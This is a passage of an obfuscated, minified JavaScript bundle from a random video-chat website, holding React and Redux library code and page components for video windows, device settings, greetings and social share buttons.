  var f = _0x25991a, i = "function" == typeof Symbol && Symbol.for, u = i ? Symbol.for("react.element") : 60103, r = i ? Symbol.for("react.portal") : 60106, o = i ? Symbol.for("react.fragment") : 60107, c = i ? Symbol.for("react.strict_mode") : 60108, t = i ? Symbol.for("react.profiler") : 60114, x = i ? Symbol.for("react.provider") : 60109, s = i ? Symbol.for("react.context") : 60110, l = i ? Symbol.for("react.async_mode") : 60111, d = i ? Symbol.for("react.concurrent_mode") : 60111, D = i ? Symbol.for("react.forward_ref") : 60112, b = i ? Symbol.for("react.suspense") : 60113, C = i ? Symbol.for("react.suspense_list") : 60120, m = i ? Symbol.for("react.memo") : 60115, v = i ? Symbol.for("react.lazy") : 60116, g = i ? Symbol.for("react.block") : 60121, _ = i ? Symbol.for("react.fundamental") : 60117, h = i ? Symbol.for("react.responder") : 60118, w = i ? Symbol.for("react.scope") : 60119;
  function p(e) {
    var n = f;
    if ("object" == typeof e && null !== e) {
      var a = e.$$typeof;
      switch (a) {
        case u:
          switch (e = e.type) {
            case l:
            case d:
            case o:
            case t:
            case c:
            case b:
              return e;
            default:
              switch (e = e && e.$$typeof) {
                case s:
                case D:
                case v:
                case m:
                case x:
                  return e;
                default:
                  return a;
              }
          }
        case r:
          return a;
      }
    }
  }
  function y(e) {
    return p(e) === d;
  }
  n.AsyncMode = l, n.ConcurrentMode = d, n.ContextConsumer = s, n.ContextProvider = x, n.Element = u, n.ForwardRef = D, n.Fragment = o, n.Lazy = v, n.Memo = m, n.Portal = r, n.Profiler = t, n.StrictMode = c, n.Suspense = b, n.isAsyncMode = function (e) {
    return y(e) || p(e) === l;
  }, n.isConcurrentMode = y, n.isContextConsumer = function (e) {
    return p(e) === s;
  }, n.isContextProvider = function (e) {
    return p(e) === x;
  }, n.isElement = function (e) {
    var n = f;
    return "object" == typeof e && null !== e && e.$$typeof === u;
  }, n.isForwardRef = function (e) {
    return p(e) === D;
  }, n.isFragment = function (e) {
    return p(e) === o;
  }, n.isLazy = function (e) {
    return p(e) === v;
  }, n.isMemo = function (e) {
    return p(e) === m;
  }, n.isPortal = function (e) {
    return p(e) === r;
  }, n.isProfiler = function (e) {
    return p(e) === t;
  }, n.isStrictMode = function (e) {
    return p(e) === c;
  }, n.isSuspense = function (e) {
    return p(e) === b;
  }, n.isValidElementType = function (e) {
    var n = f;
    return "string" == typeof e || "function" == typeof e || e === o || e === d || e === t || e === c || e === b || e === C || "object" == typeof e && null !== e && (e.$$typeof === v || e.$$typeof === m || e.$$typeof === x || e.$$typeof === s || e.$$typeof === D || e.$$typeof === _ || e.$$typeof === h || e.$$typeof === w || e.$$typeof === g);
  }, n.typeOf = p;
}, function (e, n) {
  var a, f = _0x25991a;
  a = function () {
    return this;
  }();
  try {
    a = a || new Function("return this")();
  } catch (e) {
    "object" == typeof window && (a = window);
  }
  e.exports = a;
}, function (e, n) {
  var a = _0x25991a;
  e.exports = function (e) {
    var n = a;
    if (!e.webpackPolyfill) {
      var f = Object.create(e), i = {};
      i.enumerable = true, f.children || (f.children = []), Object.defineProperty(f, "loaded", {enumerable: true, get: function () {
        return f.l;
      }}), Object.defineProperty(f, "id", {enumerable: true, get: function () {
        return f.i;
      }}), Object.defineProperty(f, "exports", i), f.webpackPolyfill = 1;
    }
    return f;
  };
}, function (e, n, a) {
  var f = _0x25991a;
  a.r(n);
  var i = a(0), u = a.n(i), r = a(1), o = a.n(r), c = (a(13), u.a.createContext(null)), x = {};
  x.notify = function () {};
  var s = function (e) {
    e();
  }, l = x;
  var d = function () {
    var e = f;
    function n(e, n) {
      var a = _0x28ad;
      this.store = e, this.parentSub = n, this.unsubscribe = null, this.listeners = l, this.handleChangeWrapper = this.handleChangeWrapper.bind(this);
    }
    var a = n.prototype;
    return a.addNestedSub = function (n) {
      var a = e;
      return this.trySubscribe(), this.listeners.subscribe(n);
    }, a.notifyNestedSubs = function () {
      var n = e;
      this.listeners.notify();
    }, a.handleChangeWrapper = function () {
      var n = e;
      this.onStateChange && this.onStateChange();
    }, a.isSubscribed = function () {
      return Boolean(this.unsubscribe);
    }, a.trySubscribe = function () {
      var n, a, i, u, r, o = e;
      this.unsubscribe || (this.unsubscribe = this.parentSub ? this.parentSub.addNestedSub(this.handleChangeWrapper) : this.store.subscribe(this.handleChangeWrapper), this.listeners = (a = s, i = null, u = null, (r = {})[(n = f)("0xb5d")] = function () {
        i = null, u = null;
      }, r.notify = function () {
        a(function () {
          for (var e = _0x28ad, n = i; n;) n.callback(), n = n.next;
        });
      }, r.get = function () {
        for (var e = n, a = [], f = i; f;) a.push(f), f = f.next;
        return a;
      }, r.subscribe = function (e) {
        var a = n, f = true, r = u = {callback: e, next: null, prev: u};
        return r.prev ? r.prev.next = r : i = r, function () {
          var e = a;
          f && null !== i && (f = false, r.next ? r.next.prev = r.prev : u = r.prev, r.prev ? r.prev.next = r.next : i = r.next);
        };
      }, r));
    }, a.tryUnsubscribe = function () {
      var n = e;
      this.unsubscribe && (this.unsubscribe(), this.unsubscribe = null, this.listeners.clear(), this.listeners = l);
    }, n;
  }();
  function D() {
    var e = f;
    return (D = Object.assign || function (n) {
      for (var a = e, f = 1; f < arguments.length; f++) {
        var i = arguments[f];
        for (var u in i) Object.prototype.hasOwnProperty.call(i, u) && (n[u] = i[u]);
      }
      return n;
    }).apply(this, arguments);
  }
  function b(e, n) {
    var a = f;
    if (null == e) return {};
    var i, u, r = {}, o = Object.keys(e);
    for (u = 0; u < o.length; u++) i = o[u], n.indexOf(i) >= 0 || (r[i] = e[i]);
    return r;
  }
  var C = a(3), m = a.n(C), v = a(2), g = "undefined" != typeof window && void 0 !== window.document && void 0 !== window.document.createElement ? i.useLayoutEffect : i.useEffect, h = [], w = [null, null];
  function p(e, n) {
    var a = f, i = e[1];
    return [n.payload, i + 1];
  }
  function y(e, n, a) {
    g(function () {
      return e.apply(void 0, n);
    }, a);
  }
  function z(e, n, a, i, u, r, o) {
    var c = f;
    e.current = i, n.current = u, a.current = false, r.current && (r.current = null, o());
  }
  function B(e, n, a, i, u, r, o, c, t, x) {
    var s = f;
    if (e) {
      var l = false, d = null, D = function () {
        var e = _0x28ad;
        if (!l) {
          var a, f, s = n.getState();
          try {
            a = i(s, u.current);
          } catch (e) {
            f = e, d = e;
          }
          f || (d = null), a === r.current ? o.current || t() : (r.current = a, c.current = a, o.current = true, x({type: "STORE_UPDATED", payload: {error: f}}));
        }
      };
      return a.onStateChange = D, a.trySubscribe(), D(), function () {
        var e = s;
        if (l = true, a.tryUnsubscribe(), a.onStateChange = null, d) throw d;
      };
    }
  }
  var L = function () {
    return [null, 0];
  };
  function M(e, n) {
    var a = f;
    void 0 === n && (n = {});
    var r = n, o = r.getDisplayName, t = void 0 === o ? function (e) {
      return "ConnectAdvanced(" + e + ")";
    } : o, x = r.methodName, s = void 0 === x ? "connectAdvanced" : x, l = r.renderCountProp, C = void 0 === l ? void 0 : l, g = r.shouldHandleStateChanges, _ = void 0 === g || g, M = r.storeKey, F = void 0 === M ? "store" : M, A = (r.withRef, r.forwardRef), k = void 0 !== A && A, E = r.context, j = void 0 === E ? c : E, S = b(r, ["getDisplayName", "methodName", "renderCountProp", "shouldHandleStateChanges", "storeKey", "withRef", "forwardRef", "context"]), T = j;
    return function (n) {
      var f = a, r = n.displayName || n.name || "Component", o = t(r), c = D({}, S, {getDisplayName: t, methodName: s, renderCountProp: C, shouldHandleStateChanges: _, storeKey: F, displayName: o, wrappedComponentName: r, WrappedComponent: n}), x = S.pure, l = x ? i.useMemo : function (e) {
        return e();
      };
      function g(a) {
        var r = f, o = Object(i.useMemo)(function () {
          var e = r, n = a.forwardedRef, f = b(a, ["forwardedRef"]);
          return [a.context, n, f];
        }, [a]), t = o[0], x = o[1], s = o[2], C = Object(i.useMemo)(function () {
          var e = r;
          return t && t.Consumer && Object(v.isContextConsumer)(u.a.createElement(t.Consumer, null)) ? t : T;
        }, [t, T]), m = Object(i.useContext)(C), g = Boolean(a.store) && Boolean(a.store.getState) && Boolean(a.store.dispatch);
        Boolean(m) && Boolean(m.store);
        var M = g ? a.store : m.store, F = Object(i.useMemo)(function () {
          return e(M.dispatch, c);
        }, [M]), A = Object(i.useMemo)(function () {
          var e = r;
          if (!_) return w;
          var n = new d(M, g ? null : m.subscription), a = n.notifyNestedSubs.bind(n);
          return [n, a];
        }, [M, g, m]), k = A[0], E = A[1], j = Object(i.useMemo)(function () {
          var e = {};
          return e.subscription = k, g ? m : D({}, m, e);
        }, [g, m, k]), S = Object(i.useReducer)(p, h, L), P = S[0][0], H = S[1];
        if (P && P.error) throw P.error;
        var N = Object(i.useRef)(), q = Object(i.useRef)(s), K = Object(i.useRef)(), U = Object(i.useRef)(false), Z = l(function () {
          var e = r;
          return K.current && s === q.current ? K.current : F(M.getState(), s);
        }, [M, P, s]);
        y(z, [q, N, U, s, Z, K, E]), y(B, [_, M, k, F, q, N, U, K, E, H], [M, k, F]);
        var G = Object(i.useMemo)(function () {
          var e = r, a = {};
          return a.ref = x, u.a.createElement(n, D({}, Z, a));
        }, [x, n, Z]);
        return Object(i.useMemo)(function () {
          var e = r, n = {};
          return n.value = j, _ ? u.a.createElement(C.Provider, n, G) : G;
        }, [C, G, j]);
      }
      var M = x ? u.a.memo(g) : g;
      if (M.WrappedComponent = n, M.displayName = o, k) {
        var A = u.a.forwardRef(function (e, n) {
          var a = f, i = {};
          return i.forwardedRef = n, u.a.createElement(M, D({}, e, i));
        });
        return A.displayName = o, A.WrappedComponent = n, m()(A, n);
      }
      return m()(M, n);
    };
  }
  function F(e, n) {
    return e === n ? 0 !== e || 0 !== n || 1 / e == 1 / n : e != e && n != n;
  }
  function A(e, n) {
    var a = f;
    if (F(e, n)) return true;
    if ("object" != typeof e || null === e || "object" != typeof n || null === n) return false;
    var i = Object.keys(e), u = Object.keys(n);
    if (i.length !== u.length) return false;
    for (var r = 0; r < i.length; r++) if (!Object.prototype.hasOwnProperty.call(n, i[r]) || !F(e[i[r]], n[i[r]])) return false;
    return true;
  }
  var k = a(4), E = function () {
    var e = f;
    return Math.random().toString(36).substring(7).split("").join(".");
  }, j = {INIT: "@@redux/INIT" + E(), REPLACE: "@@redux/REPLACE" + E(), PROBE_UNKNOWN_ACTION: function () {
    return "@@redux/PROBE_UNKNOWN_ACTION" + E();
  }};
  function S(e) {
    var n = f;
    if ("object" != typeof e || null === e) return false;
    for (var a = e; null !== Object.getPrototypeOf(a);) a = Object.getPrototypeOf(a);
    return Object.getPrototypeOf(e) === a;
  }
  function T(e, n) {
    return function () {
      var a = _0x28ad;
      return n(e.apply(this, arguments));
    };
  }
  function P(e) {
    return function (n, a) {
      var f = _0x28ad, i = e(n, a);
      function u() {
        return i;
      }
      return u.dependsOnOwnProps = false, u;
    };
  }
  function H(e) {
    var n = f;
    return null !== e.dependsOnOwnProps && void 0 !== e.dependsOnOwnProps ? Boolean(e.dependsOnOwnProps) : 1 !== e.length;
  }
  function N(e, n) {
    return function (n, a) {
      var f = _0x28ad;
      a.displayName;
      var i = function (e, n) {
        var a = f;
        return i.dependsOnOwnProps ? i.mapToProps(e, n) : i.mapToProps(e);
      };
      return i.dependsOnOwnProps = true, i.mapToProps = function (n, a) {
        var u = f;
        i.mapToProps = e, i.dependsOnOwnProps = H(e);
        var r = i(n, a);
        return "function" == typeof r && (i.mapToProps = r, i.dependsOnOwnProps = H(r), r = i(n, a)), r;
      }, i;
    };
  }
  var q = [function (e) {
    return "function" == typeof e ? N(e) : void 0;
  }, function (e) {
    return e ? void 0 : P(function (e) {
      var n = {};
      return n.dispatch = e, n;
    });
  }, function (e) {
    return e && "object" == typeof e ? P(function (n) {
      return function (e, n) {
        var a = _0x28ad;
        if ("function" == typeof e) return T(e, n);
        if ("object" != typeof e || null === e) throw new Error("bindActionCreators expected an object or a function, instead received " + (null === e ? "null" : typeof e) + '. Did you write "import ActionCreators from" instead of "import * as ActionCreators from"?');
        var f = {};
        for (var i in e) {
          var u = e[i];
          "function" == typeof u && (f[i] = T(u, n));
        }
        return f;
      }(e, n);
    }) : void 0;
  }], K = [function (e) {
    return "function" == typeof e ? N(e) : void 0;
  }, function (e) {
    return e ? void 0 : P(function () {
      return {};
    });
  }];
  function U(e, n, a) {
    return D({}, a, {}, e, {}, n);
  }
  var Z = [function (e) {
    var n;
    return "function" == typeof e ? (n = e, function (e, a) {
      var f = _0x28ad;
      a.displayName;
      var i, u = a.pure, r = a.areMergedPropsEqual, o = false;
      return function (e, a, f) {
        var c = n(e, a, f);
        return o ? u && r(c, i) || (i = c) : (o = true, i = c), i;
      };
    }) : void 0;
  }, function (e) {
    return e ? void 0 : function () {
      return U;
    };
  }];
  function G(e, n, a, f) {
    return function (i, u) {
      return a(e(i, u), n(f, u), u);
    };
  }
  function Y(e, n, a, i, u) {
    var r, o, c, t, x, s = f, l = u.areStatesEqual, d = u.areOwnPropsEqual, D = u.areStatePropsEqual, b = false;
    return function (f, u) {
      return b ? (C = f, _ = s, h = !d(m = u, o), w = !l(C, r), r = C, o = m, h && w ? (c = e(r, o), n.dependsOnOwnProps && (t = n(i, o)), x = a(c, t, o)) : h ? (e.dependsOnOwnProps && (c = e(r, o)), n.dependsOnOwnProps && (t = n(i, o)), x = a(c, t, o)) : w ? (v = e(r, o), g = !D(v, c), c = v, g && (x = a(c, t, o)), x) : x) : (c = e(r = f, o = u), t = n(i, o), x = a(c, t, o), b = true, x);
      var C, m, v, g, _, h, w;
    };
  }
  function V(e, n) {
    var a = f, i = n.initMapStateToProps, u = n.initMapDispatchToProps, r = n.initMergeProps, o = b(n, ["initMapStateToProps", "initMapDispatchToProps", "initMergeProps"]), c = i(e, o), t = u(e, o), x = r(e, o);
    return (o.pure ? Y : G)(c, t, x, e, o);
  }
  function I(e, n, a) {
    for (var i = f, u = n.length - 1; u >= 0; u--) {
      var r = n[u](e);
      if (r) return r;
    }
    return function (n, f) {
      var u = i;
      throw new Error("Invalid value of type " + typeof e + " for " + a + " argument when connecting component " + f.wrappedComponentName + ".");
    };
  }
  function W(e, n) {
    return e === n;
  }
  var J, R, O, X, Q, ee, ne, ae, fe, ie, ue, re, oe, ce, te = (Q = (X = void 0 === R ? {} : R)[(O = f)("0x30a")], ee = void 0 === Q ? M : Q, ne = X.mapStateToPropsFactories, ae = void 0 === ne ? K : ne, fe = X.mapDispatchToPropsFactories, ie = void 0 === fe ? q : fe, ue = X.mergePropsFactories, re = void 0 === ue ? Z : ue, oe = X.selectorFactory, ce = void 0 === oe ? V : oe, function (e, n, a, f) {
    var i = O;
    void 0 === f && (f = {});
    var u = f, r = u.pure, o = void 0 === r || r, c = u.areStatesEqual, t = void 0 === c ? W : c, x = u.areOwnPropsEqual, s = void 0 === x ? A : x, l = u.areStatePropsEqual, d = void 0 === l ? A : l, C = u.areMergedPropsEqual, m = void 0 === C ? A : C, v = b(u, ["pure", "areStatesEqual", "areOwnPropsEqual", "areStatePropsEqual", "areMergedPropsEqual"]), g = I(e, ae, "mapStateToProps"), _ = I(n, ie, "mapDispatchToProps"), h = I(a, re, "mergeProps"), w = {};
    return w.methodName = "connect", w.getDisplayName = function (e) {
      return "Connect(" + e + ")";
    }, w.shouldHandleStateChanges = Boolean(e), w.initMapStateToProps = g, w.initMapDispatchToProps = _, w.initMergeProps = h, w.pure = o, w.areStatesEqual = t, w.areOwnPropsEqual = s, w.areStatePropsEqual = d, w.areMergedPropsEqual = m, ee(ce, D(w, v));
  });
  J = r.unstable_batchedUpdates, s = J;
  class xe extends u.a.Component {
    ["render"]() {
      var e = f, n = {};
      n.className = "app-buttons";
      var a = {};
      a.className = "app-button";
      var i = {};
      return i.className = "app-button", config.android_app_url && config.ios_app_url ? u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement("a", {href: config.android_app_url, className: "app-btn googleplay", target: "_blank", rel: "noopener"})), u.a.createElement("div", i, u.a.createElement("a", {href: config.ios_app_url, className: "app-btn appstore", target: "_blank", rel: "noopener nofollow"}))) : "";
    }
  }
  var se = xe, le = {};
  le.className = "tr", le["data-tr"] = "users_online", le["data-tr-id"] = "1318";
  var de = te(e => ({online: e.onlineCounter.online}))(({online: e}) => u.a.createElement("div", {className: f(e > 0 ? "0x215" : "0x6b2")}, e.toLocaleString(_.language), " ", u.a.createElement("span", le, "users_online")));
  class De extends u.a.Component {
    ["maybeRenderLogo"]() {
      var e = f, n = {};
      return n.src = "/images/roulette/logo_vertical.svg", config.show_logo ? u.a.createElement("img", n) : "";
    }
    ["maybeRenderButtons"]() {
      var e = f, n = {};
      return n.className = "caption__buttons", config.android_app_url && config.ios_app_url ? u.a.createElement("div", n, u.a.createElement(se, null)) : "";
    }
    ["render"]() {
      var e = f, n = {};
      n.className = "caption remote-video__info";
      var a = {};
      return a.className = "caption__logo", config.vertical_layout ? u.a.createElement("div", n, u.a.createElement("div", a, this.maybeRenderLogo()), u.a.createElement(de, null), this.maybeRenderButtons()) : "";
    }
  }
  var be = De;
  class Ce extends u.a.Component {
    ["render"]() {
      var e = f, n = {};
      n.className = "media-devices busy", n.id = "media-devices";
      var a = {};
      a.className = "media-devices__frame";
      var i = {};
      i.className = "media-devices__wrapper";
      var r = {};
      r.className = "media-select", r.id = "video-devices";
      var o = {};
      o.className = "media-select__select";
      var c = {};
      c.className = "media-select__label";
      var t = {};
      t.className = "media-select__label-text";
      var x = {};
      x.className = "media-select__list";
      var s = {};
      s.className = "media-devices__icon icon icon_camera";
      var l = {};
      l.className = "media-select", l.id = "audio-devices";
      var d = {};
      d.className = "media-select__select";
      var D = {};
      D.className = "media-select__label";
      var b = {};
      b.className = "media-select__label-text";
      var C = {};
      C.className = "media-select__list";
      var m = {};
      return m.className = "media-devices__icon icon icon_microphone", u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement("div", i, u.a.createElement("div", r, u.a.createElement("div", o, u.a.createElement("div", c, u.a.createElement("span", t)), u.a.createElement("div", x)), u.a.createElement("div", s)), u.a.createElement("div", l, u.a.createElement("div", d, u.a.createElement("div", D, u.a.createElement("span", b)), u.a.createElement("div", C)), u.a.createElement("div", m)))));
    }
  }
  var me = Ce;
  function ve() {
    var e = f;
    return (ve = Object.assign || function (n) {
      for (var a = e, f = 1; f < arguments.length; f++) {
        var i = arguments[f];
        for (var u in i) Object.prototype.hasOwnProperty.call(i, u) && (n[u] = i[u]);
      }
      return n;
    }).apply(this, arguments);
  }
  class ge extends u.a.Component {
    constructor(e) {
      super(e);
    }
    ["componentDidMount"]() {
      var e = f, n = $(this.refs.btnContainer);
      $(window).on("roulette:init", n.show.bind(n));
    }
    ["render"]() {
      var e = f, n = {};
      return n.className = "social-button", n.ref = "btnContainer", u.a.createElement("div", ve(n, this.props), this.props.children);
    }
  }
  var _e = ge;
  class he extends u.a.Component {
    constructor(e) {
      var n = f;
      super(e), this.href = location.href, this.lang = navigator.language.slice(0, 2), this.text = document.title;
    }
    ["componentDidMount"]() {
      var e = f;
      $(window).on("roulette:init", function () {
        var n, a, f, i, u, r = e;
        document.getElementById("social-button-twitter").childNodes[0].dataset.lang = _.language, n = document, a = "script", f = "twitter-wjs", u = n.getElementsByTagName(a)[0], n.getElementById(f) || ((i = n.createElement(a)).id = f, i.src = "//platform.twitter.com/widgets.js", u.parentNode.insertBefore(i, u));
      }.bind(this));
    }
    ["render"]() {
      var e = f, n = {};
      n.id = "social-button-twitter";
      var a = {};
      return a.href = "https://twitter.com/share", a.className = "twitter-share-button", a["data-href"] = this.href, a["data-text"] = this.text, a["data-size"] = "large", u.a.createElement(_e, n, u.a.createElement("a", a, "Tweet"));
    }
  }
  var we = he;
  class pe extends u.a.Component {
    ["componentDidMount"]() {
      var e = f;
      $(window).on("roulette:init", function () {
        var n = e;
        !function (e, n, a) {
          var f = _0x28ad, i = _.language || navigator.language.replace("-", "_");
          2 == i.length && (i = i + "_" + i.toUpperCase());
          var u, r = e.getElementsByTagName(n)[0];
          e.getElementById(a) || ((u = e.createElement(n)).id = a, u.async = true, u.src = "//connect.facebook.net/" + i + "/all.js#xfbml=1", r.parentNode.insertBefore(u, r));
        }(document, "script", "facebook-jssdk");
      });
    }
    ["render"]() {
      var e = f, n = {};
      return n.className = "fb-root", n.id = "fb-root", u.a.createElement("div", n);
    }
  }
  var ye = pe;
  class ze extends u.a.Component {
    constructor(e) {
      var n = f;
      super(e), this.href = location.href;
    }
    ["render"]() {
      var e = f, n = {};
      n.id = "social-button-fb-like";
      var a = {};
      return a.className = "fb-like", a["data-href"] = this.href, a["data-layout"] = "button_count", a["data-action"] = "like", a["data-size"] = "large", a["data-show-faces"] = "false", u.a.createElement(_e, n, u.a.createElement("div", a));
    }
  }
  var Be = ze;
  class Le extends u.a.Component {
    constructor(e) {
      var n = f;
      super(e), this.href = location.href, this.fullHref = "https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(this.href) + "&src=sdkpreparse";
    }
    ["render"]() {
      var e = f, n = {};
      n.id = "social-button-fb-share";
      var a = {};
      a.className = "fb-share-button", a["data-href"] = this.href, a["data-layout"] = "button", a["data-size"] = "large", a["data-mobile-iframe"] = "true";
      var i = {};
      return i.className = "fb-xfbml-parse-ignore", i.target = "_blank", i.href = this.fullHref, u.a.createElement(_e, n, u.a.createElement("div", a, u.a.createElement("a", i, "Share")));
    }
  }
  var Me = Le;
  class Fe extends u.a.Component {
    constructor(e) {
      var n = f;
      super(e), this.buttons = config.social_buttons;
    }
    ["setButtonsWidths"]() {
      var e = f;
      let n = false, a = 0;
      $(".social-buttons .social-button").each((f, i) => {
        var u = e;
        let r = $(i).width();
        a += r + 10, this.buttons[f] = {id: i.id, widthToShow: a}, r < 10 && (n = true);
      }), n && setTimeout(this.setButtonsWidths.bind(this), 200), this.onResize();
    }
    ["onResize"]() {
      var e = f;
      const n = $(".social-buttons").width();
      $.each(this.buttons, function (a, f) {
        var i = e;
        let u = n >= f.widthToShow ? "block" : "none";
        $("#" + f.id).css("display", u);
      });
    }
    ["componentDidMount"]() {
      var e = f;
      $(window).on("roulette:init", this.setButtonsWidths.bind(this)), $(window).on("roulette:resize", this.onResize.bind(this));
    }
    ["render"]() {
      var e = f, n = {};
      return n.className = "social-buttons remote-video__likes visible", u.a.createElement("div", n, u.a.createElement(ye, null), u.a.createElement(Be, null), u.a.createElement(Me, null), u.a.createElement(we, null));
    }
  }
  var Ae = Fe;
  class ke extends u.a.Component {
    ["maybeRenderSocialButtons"]() {
      var e = f;
      return config.vertical_layout && config.social_buttons.length > 0 ? u.a.createElement(Ae, null) : "";
    }
    ["toggleFullScreen"]() {
      var e = f;
      document.webkitFullscreenElement ? document.webkitExitFullscreen() : document.body.webkitRequestFullscreen();
    }
    ["renderFullScreenBtn"]() {
      var e = f, n = {};
      n.className = "video-container__button fullscreen-button", n.onClick = this.toggleFullScreen.bind(this);
      var a = {};
      a.className = "txt";
      var i = {};
      return i.className = "tr", i["data-tr-id"] = "1465", i["data-tr"] = "full_screen", document.webkitFullscreenEnabled ? u.a.createElement("div", n, u.a.createElement("span", a, u.a.createElement("span", i, "full_screen"))) : "";
    }
    ["render"]() {
      var e = f, n = {};
      n.className = "video-container", n.id = "video-container";
      var a = {};
      a.className = "video-container__wrapper";
      var i = {};
      i.id = "remote-video-wrapper", i.className = "video-container__remote-video s-stop";
      var r = {};
      r.id = "remote-video", r.className = "video-container__video", r.autoPlay = "autoplay", r.playsInline = true;
      var o = {};
      o.className = "remote-video__preview";
      var c = {};
      c.className = "preview";
      var t = {};
      t.className = "preview";
      var x = {};
      x.backgroundImage = 'url("/images/roulette/watermark.svg")';
      var s = {};
      s.className = "remote-video__watermark", s.style = x;
      var l = {};
      l.className = "remote-video__noise";
      var d = {};
      d.id = "noise", d.className = "noise";
      var D = {};
      D.id = "vignette", D.className = "vignette";
      var b = {};
      b.className = "remote-video__alert tr", b["data-tr-id"] = "1229", b["data-tr"] = "no_partner_camera";
      var C = {};
      C.className = "pleer";
      var m = {};
      m.className = "pleer__icon icon";
      var v = {};
      v.className = "pleer__volume";
      var g = {};
      g.className = "pleer__volume-slider";
      var _ = {};
      _.className = "pleer__volume-level";
      var h = {};
      h.className = "pleer__volume-bg";
      var w = {};
      w.className = "video-container__buttons remote-video__buttons";
      var p = {};
      p.className = "video-container__buttons-wrap";
      var y = {};
      y.className = "video-container__button report-button";
      var z = {};
      z.className = "txt";
      var B = {};
      B.className = "tr", B["data-tr-id"] = "1322", B["data-tr"] = "report_2";
      var L = {};
      L.id = "local-video-wrapper", L.className = "video-container__local-video";
      var M = {};
      M.id = "local-video", M.className = "video-container__video video-container-local-video", M.autoPlay = "autoplay", M.muted = "muted", M.playsInline = true;
      var F = {};
      F.className = "local-video__shim";
      var A = {};
      A.className = "preloader";
      var k = {};
      k.className = "video-container__alert", k.id = "local-video-alert";
      var E = {};
      E.className = "video-container__alert-text tr", E["data-tr-id"] = "1276", E["data-tr"] = "no_camera";
      var j = {};
      j.className = "video-container__buttons";
      var S = {};
      S.className = "video-container__buttons-wrap";
      var T = {};
      T.className = "video-container__button settings-button";
      var P = {};
      P.className = "txt";
      var H = {};
      H.className = "tr", H["data-tr-id"] = "504", H["data-tr"] = "settings";
      var N = {};
      N.className = "bResizer", N.id = "videoResizer";
      var q = {};
      return q.className = "resizer__icon vertical", u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement("div", i, u.a.createElement("video", r), u.a.createElement("div", o, u.a.createElement("div", c), u.a.createElement("div", t)), u.a.createElement("div", s), u.a.createElement("div", l, u.a.createElement("canvas", d), u.a.createElement("div", D)), u.a.createElement("div", b, "no_partner_camera"), this.maybeRenderSocialButtons(), u.a.createElement("div", C, u.a.createElement("div", m), u.a.createElement("div", v, u.a.createElement("div", g), u.a.createElement("div", _), u.a.createElement("div", h))), u.a.createElement(be, null), u.a.createElement("div", w, u.a.createElement("div", p, u.a.createElement("div", y, u.a.createElement("span", z, u.a.createElement("span", B, "report_2")))))), u.a.createElement("div", L, u.a.createElement("video", M), u.a.createElement("div", F), u.a.createElement(me, null), u.a.createElement("div", A), u.a.createElement("div", k, u.a.createElement("div", E, "no_camera")), u.a.createElement("div", j, u.a.createElement("div", S, this.renderFullScreenBtn(), u.a.createElement("div", T, u.a.createElement("span", P, u.a.createElement("span", H, "settings"))))))), u.a.createElement("div", N, u.a.createElement("div", q)));
    }
  }
  var Ee = ke;
  function je() {
    var e = f;
    return (je = Object.assign || function (n) {
      for (var a = e, f = 1; f < arguments.length; f++) {
        var i = arguments[f];
        for (var u in i) Object.prototype.hasOwnProperty.call(i, u) && (n[u] = i[u]);
      }
      return n;
    }).apply(this, arguments);
  }
  class Se extends u.a.Component {
    constructor(e) {
      var n = f;
      super(e), this.className = "btn " + (this.props.className || "");
    }
    ["render"]() {
      var e = f, n = {};
      n.className = this.className;
      var a = {};
      return a.className = "btn__bg", u.a.createElement("div", je({}, this.props, n), u.a.createElement("div", a, this.props.children));
    }
  }
  var Te = Se;
  class Pe extends u.a.Component {
    ["render"]() {
      var e = f, n = {};
      n.className = "gender-selector";
      var a = {};
      a.className = "gender-selector__button";
      var i = {};
      i.className = "btn-gray gender-selector-button";
      var r = {};
      r.className = "tr", r["data-tr-id"] = "1314", r["data-tr"] = "your_gender";
      var o = {};
      o.className = "selected-value";
      var c = {};
      return c.className = "gender-selector__popup", u.a.createElement("div", n, u.a.createElement("div", a, u.a.createElement(Te, i, u.a.createElement("span", r, "your_gender"), u.a.createElement("span", null, ": "), u.a.createElement("span", o))), u.a.createElement("div", c));
    }
  }
  var He = Pe;
  class Ne extends u.a.Component {
    ["renderLogo"]() {
      var e = f, n = {};
      n.className = "chat__greetings-logo";
      var a = {};
      a.href = "/", a.target = "_blank";
      var i = {};
      i.src = "/images/roulette/logo_index.svg";
      var r = {};
      return r.className = "small", r.src = "/images/roulette/logo_index_sm.svg", u.a.createElement("div", n, u.a.createElement("a", a, u.a.createElement("img", i), u.a.createElement("img", r)));
    }
    ["sayHello"]() {
      var e = f, n = {};
      return n.className = "chat__welcome-text tr", n["data-tr-id"] = "1289", n["data-tr"] = "welcome", u.a.createElement("div", n, "welcome");
    }
    ["renderLogoOrSayHello"]() {
      var e = f;
      return config.show_logo ? this.renderLogo() : this.sayHello();
    }
    ["maybeShowDisclaimer"]() {
      var e = f;
      return config.show_disclaimer ? u.a.createElement("p", null, "Disclaimer: Chatalternative.com in no way implies or claims any association with Chatroulette.com.") : "";
    }
    ["showRulesText"]() {
      var e = f, n = {};
      n.className = "tr", n["data-tr-id"] = "1244", n["data-tr"] = "rules";
      var a = {};
      return a.className = "tr", a["data-tr-id"] = "1333", a["data-tr"] = "rules_2", config.show_rules_text ? u.a.createElement("p", n, "rules") : u.a.createElement("p", a, "rules_2");
    }
    ["maybeShowVkText"]() {
      var e = f, n = {};
      n.href = "http://vk.com/chatruletka";
      var a = {};
      return a.href = "https://vk.com/chatruletka?w=page-35100531_48909513", config.is_vk_app && config.show_rules_text ? u.a.createElement("div", null, u.a.createElement("p", null, "Подписывайтесь на нашу страницу ВКонтакте: ", u.a.createElement("a", n, "http://vk.com/chatruletka"), "."), u.a.createElement("p", null, "Если у вас возникли какие-то проблемы или вопросы, посетите наш ", u.a.createElement("a", a, "ЧаВО/FAQ"), ".")) : "";
    }
    ["render"]() {
      var e = f, n = {};
      n.className = "chat__greetings-content";
      var a = {};
      a.className = "chat__greetings-gap";
      var i = {};
      i.className = "chat__greetings-gap";
      var r = {};
      r.className = "chat__greetings-button";
      var o = {};
      o.className = "chat__greetings-button-wrapper";
      var c = {};
      c.id = "big-start-button", c.className = "btn btn-main";
      var t = {};
      t.className = "tr", t["data-tr-id"] = "1233", t["data-tr"] = "welcome_start_button";
      var x = {};
      x.className = "chat__greetings-button-wrapper";
      var s = {};
      s.className = "chat__greetings-gap";
      var l = {};
